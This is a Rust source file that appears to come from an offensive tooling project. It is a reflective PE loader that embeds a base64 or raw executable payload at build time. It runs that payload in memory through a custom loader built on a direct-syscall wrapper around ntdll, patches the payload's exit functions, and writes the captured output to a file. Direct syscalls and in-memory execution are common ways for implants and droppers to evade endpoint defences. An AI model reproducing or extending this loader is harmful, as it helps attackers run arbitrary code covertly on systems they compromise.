use std::any::Any;
use std::fs::File;
use std::io::Write;
use std::panic;

use crate::common::output::OutputRedirector;
#[allow(unused_imports)]
use crate::debug_error;
#[allow(unused_imports)]
use crate::debug_ok_msg;
#[allow(unused_imports)]
use crate::debug_error_msg;
#[allow(unused_imports)]
use crate::debug_base_msg;
#[allow(unused_imports)]
use crate::debug_base_hex;
#[allow(unused_imports)]
use crate::debug_success_msg;
#[allow(unused_imports)]
use crate::debug_base;
#[allow(unused_imports)]
use crate::debug_info_msg;



use crate::winapi::nt::syscall_wrapper::SyscallWrapper;
use crate::winapi::pe_loader::PE_Loader;
use crate::winapi::pe_loader::PE_Options;


#[allow(dead_code)]
pub fn do_load()
{
    let result: Result<(), Box<dyn Any + Send>> = panic::catch_unwind(|| {
        let pe_bytes = get_pe();
        debug_success_msg!(format!("PE loaded, size = {}", pe_bytes.len()));
        let options = PE_Options {
            patch_exit_functions: true,
            collect_output: true,
        };
        load(pe_bytes, options);
    });
    match result {
        Err(_) => debug_error_msg!(format!("An Error occured")),
        _ => ()
    }
}

#[cfg(all(feature = "payload_b64"))]
fn get_pe() -> Vec<u8> {
    let base64_pe_bytes = include_str!(env!("PAYLOAD_FILE_NAME"));
    crate::common::helpers::base64_to_vec(base64_pe_bytes)
}

#[cfg(all(feature = "payload_bin"))]
fn get_pe() -> Vec<u8> {
    let pe_bytes = include_bytes!(env!("PAYLOAD_FILE_NAME"));
    pe_bytes.to_vec()
}
 
fn load(pe_bytes: Vec<u8>, options: PE_Options) {
    let args = String::from(env!("PAYLOAD_ARGUMENTS"));
    let ntdll = SyscallWrapper::new();
    let redirector = OutputRedirector::new();

    let mut pe_loader = PE_Loader::new(ntdll, redirector, options);

    let (res, output) = pe_loader.execute_exe(pe_bytes.clone(), args);
    if !res {
        debug_error_msg!("Failed to execute PE."); 
    }

    match output {
       None => debug_info_msg!("No output"),
       Some(output) => { 
            //debug_success_msg!(format!("PE Executed : output = \n{}", output));
            let mut file = File::create("output.txt").unwrap();
            write!(file, "{}", output).unwrap();
        }
    }

   
}

